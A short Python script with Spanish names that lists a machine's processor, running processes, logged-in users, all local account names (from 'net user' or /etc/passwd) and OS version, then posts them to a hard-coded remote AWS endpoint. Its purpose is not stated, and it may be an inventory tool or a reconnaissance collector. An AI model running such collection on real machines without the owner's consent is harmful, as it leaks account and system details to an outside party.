import psutil
import platform
import requests
import subprocess
import os

def obtener_usuarios():
    usuarios = []
    sistema_operativo = platform.system()
    
    if sistema_operativo == "Windows":
        resultado = subprocess.run(['net', 'user'], capture_output=True, text=True)
        usuarios = resultado.stdout.splitlines()
        usuarios = [line.strip() for line in usuarios if line.strip() and not line.startswith("-------------------------------------------------------------------------------")]
    
    elif sistema_operativo == "Linux":
        with open('/etc/passwd') as f:
            for line in f:
                partes = line.split(':')
                usuarios.append(partes[0])
    
    return usuarios

def obtener_informacion():
    info = {
        "procesador": platform.processor(),
        "procesos": [
            proc.info 
            for proc in psutil.process_iter(['pid', 'name', 'status']) 
            if proc.info['status'] == psutil.STATUS_RUNNING
        ],
        "usuarios_activos": [user._asdict() for user in psutil.users()], 
        "todos_los_usuarios": obtener_usuarios(),  
        "sistema_operativo": platform.system(),
        "version_sistema": platform.version()
    }
    return info

def enviar_informacion(info, url):
    response = requests.post(url, json=info)
    return response.status_code

if __name__ == "__main__":
    base_url = "https://t3jxqxig0f.execute-api.us-east-1.amazonaws.com/dev"
    endpoint_guardar = f"{base_url}/guardar"
    info = obtener_informacion()
    status = enviar_informacion(info, endpoint_guardar)
    print(f"estado: {status}")